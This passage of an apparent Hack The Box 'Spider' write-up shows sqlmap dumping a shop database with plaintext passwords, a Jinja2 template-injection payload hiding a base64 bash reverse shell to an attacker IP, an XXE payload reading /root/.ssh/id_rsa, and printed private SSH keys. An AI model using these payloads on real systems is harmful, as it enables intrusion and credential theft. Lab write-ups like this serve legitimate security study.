class="string">&#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;</span></span><br><span class="line">[10:10:15] [INFO] testing <span class="string">&#x27;PostgreSQL AND error-based - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[10:10:22] [INFO] testing <span class="string">&#x27;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&#x27;</span></span><br><span class="line">[10:10:29] [INFO] testing <span class="string">&#x27;Oracle AND error-based - WHERE or HAVING clause (XMLType)&#x27;</span></span><br><span class="line">[10:10:35] [INFO] testing <span class="string">&#x27;Generic inline queries&#x27;</span></span><br><span class="line">[10:10:37] [INFO] testing <span class="string">&#x27;PostgreSQL &gt; 8.1 stacked queries (comment)&#x27;</span></span><br><span class="line">[10:10:42] [INFO] testing <span class="string">&#x27;Microsoft SQL Server/Sybase stacked queries (comment)&#x27;</span></span><br><span class="line">[10:10:47] [INFO] testing <span class="string">&#x27;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&#x27;</span></span><br><span class="line">[10:10:53] [INFO] testing <span class="string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span></span><br><span class="line">[10:11:11] [INFO] (custom) HEADER parameter <span class="string">&#x27;Cookie #1*&#x27;</span> appears to be <span class="string">&#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span> injectable </span><br><span class="line">it looks like the back-end DBMS is <span class="string">&#x27;MySQL&#x27;</span>. Do you want to skip <span class="built_in">test</span> payloads specific <span class="keyword">for</span> other DBMSes? [Y/n] n</span><br><span class="line"><span class="keyword">for</span> the remaining tests, <span class="keyword">do</span> you want to include all tests <span class="keyword">for</span> <span class="string">&#x27;MySQL&#x27;</span> extending provided level (1) and risk (1) values? [Y/n] </span><br><span class="line">[10:11:32] [INFO] testing <span class="string">&#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span></span><br><span class="line">[10:11:32] [INFO] automatically extending ranges <span class="keyword">for</span> UNION query injection technique tests as there is at least one other (potential) technique found</span><br><span class="line">[10:12:00] [INFO] target URL appears to be UNION injectable with 1 columns</span><br><span class="line">[10:12:03] [INFO] (custom) HEADER parameter <span class="string">&#x27;Cookie #1*&#x27;</span> is <span class="string">&#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span> injectable</span><br><span class="line">(custom) HEADER parameter <span class="string">&#x27;Cookie #1*&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="keyword">if</span> any)? [y/N] </span><br><span class="line">sqlmap identified the following injection point(s) with a total of 74 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: Cookie <span class="comment">#1* ((custom) HEADER)</span></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: session=<span class="string">&#x27; AND (SELECT 1456 FROM (SELECT(SLEEP(5)))zGio) AND &#x27;</span>IMkG<span class="string">&#x27;=&#x27;</span>IMkG</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 2 columns</span><br><span class="line">    Payload: session=<span class="string">&#x27; UNION ALL SELECT CONCAT(0x7162717a71,0x477a7a5770686c685a45574950634d4446784e46646d594a4c664f75705a787175564d6c4e72484b,0x716a626271)-- -</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[10:12:11] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web server operating system: Linux Ubuntu</span></span><br><span class="line"><span class="string">web application technology: Nginx 1.14.0</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[10:12:20] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries</span></span><br><span class="line"><span class="string">[10:12:20] [INFO] fetching current database</span></span><br><span class="line"><span class="string">[10:12:21] [INFO] fetching tables for database: &#x27;</span>shop<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:12:22] [INFO] fetching columns for table &#x27;</span>items<span class="string">&#x27; in database &#x27;</span>shop<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:12:24] [INFO] fetching entries for table &#x27;</span>items<span class="string">&#x27; in database &#x27;</span>shop<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Database: shop</span></span><br><span class="line"><span class="string">Table: items</span></span><br><span class="line"><span class="string">[6 entries]</span></span><br><span class="line"><span class="string">+----+-------------+-------+---------------------------------------------------+-------------------------------------------------------------------------+</span></span><br><span class="line"><span class="string">| id | name        | price | image_path                                        | description                                                             |</span></span><br><span class="line"><span class="string">+----+-------------+-------+---------------------------------------------------+-------------------------------------------------------------------------+</span></span><br><span class="line"><span class="string">| 1  | Chair       | 1337  | stefan-chair-brown-black__0727320_PE735593_S5.JPG | This is a beautiful chair, finest quality, previously owned by Mitnick. |</span></span><br><span class="line"><span class="string">| 2  | Black Chair | 1337  | martin-chair-black-black__0729761_PE737128_S5.JPG | This is the same as the other one but in black.                         |</span></span><br><span class="line"><span class="string">| 3  | Chair       | 1337  | stefan-chair-brown-black__0727320_PE735593_S5.JPG | This is a beautiful chair, finest quality, previously owned by Mitnick. |</span></span><br><span class="line"><span class="string">| 4  | Black Chair | 1337  | martin-chair-black-black__0729761_PE737128_S5.JPG | This is the same as the other one but in black.                         |</span></span><br><span class="line"><span class="string">| 5  | Chair       | 1337  | stefan-chair-brown-black__0727320_PE735593_S5.JPG | This is a beautiful chair, finest quality, previously owned by Mitnick. |</span></span><br><span class="line"><span class="string">| 6  | Black Chair | 1337  | martin-chair-black-black__0729761_PE737128_S5.JPG | This is the same as the other one but in black.                         |</span></span><br><span class="line"><span class="string">+----+-------------+-------+---------------------------------------------------+-------------------------------------------------------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:12:25] [INFO] table &#x27;</span>shop.items<span class="string">&#x27; dumped to CSV file &#x27;</span>/root/.sqlmap/output/spider.htb/dump/shop/items.csv<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:12:25] [INFO] fetching columns for table &#x27;</span><span class="built_in">users</span><span class="string">&#x27; in database &#x27;</span>shop<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:12:26] [INFO] fetching entries for table &#x27;</span><span class="built_in">users</span><span class="string">&#x27; in database &#x27;</span>shop<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Database: shop</span></span><br><span class="line"><span class="string">Table: users</span></span><br><span class="line"><span class="string">[4 entries]</span></span><br><span class="line"><span class="string">+----+--------------------------------------+------------+-----------------+</span></span><br><span class="line"><span class="string">| id | uuid                                 | name       | password        |</span></span><br><span class="line"><span class="string">+----+--------------------------------------+------------+-----------------+</span></span><br><span class="line"><span class="string">| 1  | 129f60ea-30cf-4065-afb9-6be45ad38b73 | chiv       | ch1VW4sHERE7331 |</span></span><br><span class="line"><span class="string">| 2  | 9a13e0f6-ee27-4968-908f-0d9882c1f28a | lucifer11  | lucifer11       |</span></span><br><span class="line"><span class="string">| 3  | dc63b342-e0d0-4503-945b-71a3cf365f8e | &#123;&#123;7*7&#125;&#125;    | &#123;&#123;7*7&#125;&#125;         |</span></span><br><span class="line"><span class="string">| 4  | 38af247a-100f-4712-81c0-5ac1b95e8a95 | &#123;&#123;config&#125;&#125; | &#123;&#123;config&#125;&#125;      |</span></span><br><span class="line"><span class="string">+----+--------------------------------------+------------+-----------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:12:28] [INFO] table &#x27;</span>shop.users<span class="string">&#x27; dumped to CSV file &#x27;</span>/root/.sqlmap/output/spider.htb/dump/shop/users.csv<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:12:28] [INFO] fetching columns for table &#x27;</span>support<span class="string">&#x27; in database &#x27;</span>shop<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:12:29] [INFO] fetching entries for table &#x27;</span>support<span class="string">&#x27; in database &#x27;</span>shop<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:12:32] [INFO] fetching number of entries for table &#x27;</span>support<span class="string">&#x27; in database &#x27;</span>shop<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:12:32] [INFO] retrieved: </span></span><br><span class="line"><span class="string">[10:12:32] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions </span></span><br><span class="line"><span class="string">do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#x27;</span>--time-sec<span class="string">&#x27;)? [Y/n] </span></span><br><span class="line"><span class="string">[10:14:03] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)</span></span><br><span class="line"><span class="string">0</span></span><br><span class="line"><span class="string">[10:14:15] [WARNING] table &#x27;</span>support<span class="string">&#x27; in database &#x27;</span>shop<span class="string">&#x27; appears to be empty</span></span><br><span class="line"><span class="string">Database: shop</span></span><br><span class="line"><span class="string">Table: support</span></span><br><span class="line"><span class="string">[0 entries]</span></span><br><span class="line"><span class="string">+------------+---------+---------+-------------+</span></span><br><span class="line"><span class="string">| support_id | contact | message | timestamp   |</span></span><br><span class="line"><span class="string">+------------+---------+---------+-------------+</span></span><br><span class="line"><span class="string">+------------+---------+---------+-------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:14:15] [INFO] table &#x27;</span>shop.support<span class="string">&#x27; dumped to CSV file &#x27;</span>/root/.sqlmap/output/spider.htb/dump/shop/support.csv<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:14:15] [INFO] fetching columns for table &#x27;</span>messages<span class="string">&#x27; in database &#x27;</span>shop<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:14:16] [INFO] fetching entries for table &#x27;</span>messages<span class="string">&#x27; in database &#x27;</span>shop<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Database: shop</span></span><br><span class="line"><span class="string">Table: messages</span></span><br><span class="line"><span class="string">[1 entry]</span></span><br><span class="line"><span class="string">+---------+---------+-----------------------------------------------------------------------------------+---------------------+</span></span><br><span class="line"><span class="string">| post_id | creator | message                                                                           | timestamp           |</span></span><br><span class="line"><span class="string">+---------+---------+-----------------------------------------------------------------------------------+---------------------+</span></span><br><span class="line"><span class="string">| 1       | 1       | Fix the &lt;b&gt;/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal&lt;/b&gt; portal! | 2020-04-24 15:02:41 |</span></span><br><span class="line"><span class="string">+---------+---------+-----------------------------------------------------------------------------------+---------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:14:17] [INFO] table &#x27;</span>shop.messages<span class="string">&#x27; dumped to CSV file &#x27;</span>/root/.sqlmap/output/spider.htb/dump/shop/messages.csv<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:14:17] [WARNING] HTTP error codes detected during run:</span></span><br><span class="line"><span class="string">500 (Internal Server Error) - 84 times</span></span><br><span class="line"><span class="string">[10:14:17] [INFO] fetched data logged to text files under &#x27;</span>/root/.sqlmap/output/spider.htb<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 10:14:17 /2021-06-04/</span></span><br></pre></td></tr></table></figure>
+
+<p>I got the uuid and Password of chiv.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| 1  | 129f60ea-30cf-4065-afb9-6be45ad38b73 | chiv       | ch1VW4sHERE7331 |</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s try to login with chiv.</p>
+<p>Now we have access of admin page let’s check the messages.</p>
+<p>We got the portal link which they said fix the portal let’s go to that link and check what inside there.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal</span><br></pre></td></tr></table></figure>
+
+<p>There is a support portal which we want to fix it’s mean there is a problem in support portal.</p>
+<p>After hit and try i got the correct payload to get rev shell.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzL3RyZWUvbWFzdGVyL1NlcnZlciUyMFNpZGUlMjBUZW1wbGF0ZSUyMEluamVjdGlvbiNqaW5qYTI=">Server Side Template Injection<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% with a = request[<span class="string">&quot;application&quot;</span>][<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fbuiltins\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fimport\x5f\x5f&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzkwMDEgMD4mMQ== | base64 -d | bash&quot;</span>)[<span class="string">&quot;read&quot;</span>]() %&#125; a &#123;% endwith %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Just change the base64 string with your ip and port and again encode with base64 and paste it in payload.</p>
+<p>Now after that start your netcat listner on port which you add inside payload.</p>
+<p>Now add your payload inside both parameter and submit the req.</p>
+<p>And now if we check our netcat listner we got the shell as chiv.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/spider]</span><br><span class="line">└─<span class="comment"># nc -lvp 9001</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9001</span><br><span class="line">Ncat: Listening on 0.0.0.0:9001</span><br><span class="line">Ncat: Connection from 10.10.10.243.</span><br><span class="line">Ncat: Connection from 10.10.10.243:43612.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1386): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">chiv@spider:/var/www/webapp$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(chiv) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">chiv@spider:/var/www/webapp$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">chiv</span><br><span class="line">chiv@spider:/var/www/webapp$ <span class="built_in">cd</span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">chiv@spider:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">chiv@spider:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">752a1885aef326b3d705f0b7ca531e4b</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1990.jpg"></li>
+</ul>
+<p>And if we go inside &#x2F;home&#x2F;chiv&#x2F;.ssh directory we got the id_rsa key.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">chiv@spider:~/.ssh$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 16</span><br><span class="line">drwx------ 2 chiv chiv 4096 May  6 11:42 .</span><br><span class="line">drwxr-xr-x 6 chiv chiv 4096 May 18 00:23 ..</span><br><span class="line">-rw-r--r-- 1 chiv chiv  393 May  4 15:42 authorized_keys</span><br><span class="line">-rw------- 1 chiv chiv 1679 Apr 24  2020 id_rsa</span><br><span class="line">chiv@spider:~/.ssh$ <span class="built_in">cat</span> id_rsa</span><br><span class="line"><span class="built_in">cat</span> id_rsa</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEpAIBAAKCAQEAmGvQ3kClVX7pOTDIdNTsQ5EzQl+ZLbpRwDgicM4RuWDvDqjV</span><br><span class="line">gjWRBF5B75h/aXjIwUnMXA7XimrfoudDzjynegpGDZL2LHLsVnTkYwDq+o/MnkpS</span><br><span class="line">U7tVc2i/LtGvrobrzNRFX8taAOQ561iH9xnR2pPGwHSF1/rHQqaikl9t85ESdrp9</span><br><span class="line">MI+JsgXF4qwdo/zrgxGdcOa7zq6zlnwYlY2zPZZjHYxrrwbJiD7H2pQNiegBQgu7</span><br><span class="line">BLRlsGclItrZB+p4w6pi0ak8NcoKVdeOLpQq0i58vXUCGqtp9iRA0UGv3xmHakM2</span><br><span class="line">VTZrVb7Q0g5DGbEXcIW9oowFXD2ufo2WPXym0QIDAQABAoIBAH4cNqStOB6U8sKu</span><br><span class="line">6ixAP3toF9FC56o+DoXL7DMJTQDkgubOKlmhmGrU0hk7Q7Awj2nddYh1f0C3THGs</span><br><span class="line">hx2MccU32t5ASg5cx86AyLZhfAn0EIinVZaR2RG0CPrj40ezukWvG/c2eTFjo8hl</span><br><span class="line">Z5m7czY2LqvtvRAGHfe3h6sz6fUrPAkwLTl6FCnXL1kCEUIpKaq5wKS1xDHma3Pc</span><br><span class="line">XVQU8a7FwiqCiRRI+GqJMY0+uq8/iao20jF+aChGu2cAP78KAyQU4NIsKNnewIrq</span><br><span class="line">54dWOw8lwOXp2ndmo3FdOfjm1SMNYtB5yvPR9enbu3wkX94fC/NS9OqLLMzZfYFy</span><br><span class="line">f0EMoUECgYEAxuNi/9sNNJ6UaTlZTsn6Z8X/i4AKVFgUGw4sYzswWPC4oJTDDB62</span><br><span class="line">nKr2o33or9dTVdWki1jI41hJCczx2gRqCGtu0yO3JaCNY5bCA338YymdVkphR9TL</span><br><span class="line">j0UOJ1vHU06RFuD28orK+w0b+gVanQIiz/o57xZ1sVNaNOyJUlsenh8CgYEAxDCO</span><br><span class="line">JjFKq+0+Byaimo8aGjFiPQFMT2fmOO1+/WokN+mmKLyVdh4W22rVV4v0hn937EPW</span><br><span class="line">K1Oc0/hDtSSHSwI/PSN4C2DVyOahrDcPkArfOmBF1ozcR9OBAJME0rnWJm6uB7Lv</span><br><span class="line">hm1Ll0gGJZ/oeBPIssqG1srvUNL/+sPfP3x8PQ8CgYEAqsuqwL2EYaOtH4+4OgkJ</span><br><span class="line">mQRXp5yVQklBOtq5E55IrphKdNxLg6T8fR30IAKISDlJv3RwkZn1Kgcu8dOl/eu8</span><br><span class="line">gu5/haIuLYnq4ZMdmZIfo6ihDPFjCSScirRqqzINwmS+BD+80hyOo3lmhRcD8cFb</span><br><span class="line">0+62wbMv7s/9r2VRp//IE1ECgYAHf7efPBkXkzzgtxhWAgxEXgjcPhV1n4oMOP+2</span><br><span class="line">nfz+ah7gxbyMxD+paV74NrBFB9BEpp8kDtEaxQ2Jefj15AMYyidHgA8L28zoMT6W</span><br><span class="line">CeRYbd+dgMrWr/3pULVJfLLzyx05zBwdrkXKZYVeoMsY8+Ci/NzEjwMwuq/wHNaG</span><br><span class="line">rbJt/wKBgQCTNzPkU50s1Ad0J3kmCtYo/iZN62poifJI5hpuWgLpWSEsD05L09yO</span><br><span class="line">TTppoBhfUJqKnpa6eCPd+4iltr2JT4rwY4EKG0fjWWrMzWaK7GnW45WFtCBCJIf6</span><br><span class="line">IleM+8qziZ8YcxqeKNdpcTZkl2VleDsZpkFGib0NhKaDN9ugOgpRXw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s change our shell to ssh shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/spider]</span><br><span class="line">└─<span class="comment"># ssh -i user chiv@10.10.10.243</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.10.243 (10.10.10.243)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:Z0c/GTs+BeZXyXf2c/kRC1Y+omqtI1wPaEfrz0vvYCM.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.10.243<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Last login: Fri May 21 15:02:03 2021 from 10.10.14.7</span></span><br><span class="line"><span class="string">chiv@spider:~$ id</span></span><br><span class="line"><span class="string">uid=1000(chiv) gid=1000(chiv) groups=1000(chiv)</span></span><br><span class="line"><span class="string">chiv@spider:~$ whoami</span></span><br><span class="line"><span class="string">chiv</span></span><br><span class="line"><span class="string">chiv@spider:~$ cat user.txt</span></span><br><span class="line"><span class="string">752a1885aef326b3d705f0b7ca531e4b</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h3><p>let’s run linPEAS.</p>
+<p>After analyzing the linPEAS output i found a service running on localhost on port 8080.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1991.jpg"></li>
+</ul>
+<p>For access the port 8080 we need to forward the port.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i user -L 9002:localhost:8080 chiv@spider.htb</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s open the firefox and got to localhost:9002</p>
+<p>And we got the beta login page.</p>
+<p>Let’s sign in with any username.</p>
+<p>This is a shopping cart page where no links are working except logout and our username is also reflected.</p>
+<p>And if we see the cookies we see a session cookie let’s try to decode this.</p>
+<p>I use flask-unsign to decode this.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/spider]</span><br><span class="line">└─<span class="comment"># flask-unsign --decode --cookie .eJxNjsFPgzAchf8V07OH1rGDHJGWyaSkhV8LvYE1KYMimU1kLvvf3RJjdnz58r73zmha_YTiM3roUYyAcmbpWosxV1KHWXmiP3Rx6ndm6IBFdbYkFkgqGlmoVL4BdXvrX3-gCumVzxXwpGTLTh4Sc-O3bPCUCm1zgWlkmCv7jAeu3aAIHNvR6c6zRvv10I0qAlpsi-uemqehB4P1JHD13__zZ6ytvTGK5LhV73iPCbUb4zTdeq1sZTPW8Je7P_T7BN6NEsNRPC0b63koGzPKVDyjyyNaPoc5fKEYX34BWehYFw.YLo7NA.ZN0R3IrwiVI3inmmeoi3SoM5COw</span></span><br><span class="line">&#123;<span class="string">&#x27;lxml&#x27;</span>: b<span class="string">&#x27;PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+bHVjaWZlcjExPC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4=&#x27;</span>, <span class="string">&#x27;points&#x27;</span>: 0&#125;</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/spider]</span><br><span class="line">└─<span class="comment"># echo -n PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+bHVjaWZlcjExPC91c2VybmFtZT4KICAgICAgICA8aXNfYWRtaW4+MDwvaXNfYWRtaW4+CiAgICA8L2RhdGE+Cjwvcm9vdD4= | base64 -d</span></span><br><span class="line">&lt;!-- API Version 1.0.0 --&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">    &lt;data&gt;</span><br><span class="line">        &lt;username&gt;lucifer11&lt;/username&gt;</span><br><span class="line">        &lt;is_admin&gt;0&lt;/is_admin&gt;</span><br><span class="line">    &lt;/data&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>And we also see a hidden value in login view page source.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1992.jpg"></li>
+</ul>
+<p>So we can do XXE(XML External Entity Injection)</p>
+<ul>
+<li>Link: <span class="exturl" data-url="aHR0cHM6Ly9ncmFjZWZ1bHNlY3VyaXR5LmNvbS94eGUtY2hlYXRzaGVldC14bWwtZXh0ZXJuYWwtZW50aXR5LWluamVjdGlvbi8=">XXE Cheatsheet – XML External Entity Injection<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>After that i analize that we need to put our payload inside this hidden version field and the output is show in username field becuase the username field is reflected when we login inside that.</p>
+<p>Now after some hit and try i got lfi and i can read inside root directory so let’s get the root id_rsa key.</p>
+<p>For that i intercept the req of login in burp and add this payload.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=%26username%3b&amp;version=1.0.0--&gt;&lt;!DOCTYPE+foo+[&lt;!ENTITY+username+SYSTEM+<span class="string">&quot;/root/.ssh/id_rsa&quot;</span>&gt;+]&gt;&lt;!--</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&amp;username;&amp;version=1.0.0--&gt;&lt;!DOCTYPE+foo+[&lt;!ENTITY+username+SYSTEM+<span class="string">&quot;/root/.ssh/id_rsa&quot;</span>&gt;+]&gt;&lt;!--</span><br></pre></td></tr></table></figure>
+
+<p>Boom 🧨 we got the id_rsa of root.</p>
+<p>View page source for formatter the id_rsa.</p>
+<ul>
+<li>root_rsa</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAl/dn2XpJQuIw49CVNdAgdeO5WZ47tZDYZ+7tXD8Q5tfqmyxq</span><br><span class="line">gsgQskHffuzjq8v/q4aBfm6lQSn47G8foq0gQ1DvuZkWFAATvTjliXuE7gLcItPt</span><br><span class="line">iFtbg7RQV/xaTwAmdRfRLb7x63TG6mZDRkvFvGfihWqAnkuJNqoVJclgIXLuwUvk</span><br><span class="line">4d3/Vo/MdEUb02ha7Rw9oHSYKR4pIgv4mDwxGGL+fwo6hFNCZ+YK96wMlJc3vo5Z</span><br><span class="line">EgkdKXy3RnLKvtxjpIlfmAZGu0T+RX1GlmoPDqoDWRbWU+wdbES35vqxH0uM5WUh</span><br><span class="line">vPt5ZDGiKID4Tft57udHxPiSD6YBhLT5ooHfFQIDAQABAoIBAFxB9Acg6Vc0kO/N</span><br><span class="line">krhfyUUo4j7ZBHDfJbI7aFinZPBwRtq75VHOeexud2vMDxAeQfJ1Lyp9q8/a1mdb</span><br><span class="line">sz4EkuCrQ05O9QthXJp0700+8t24WMLAHKW6qN1VW61+46iwc6iEtBZspNwIQjbN</span><br><span class="line">rKwBlmMiQnAyzzDKtNu9+Ca/kZ/cAjLpz3m1NW7X//rcDL8kBGs8RfuHqz/R4R7e</span><br><span 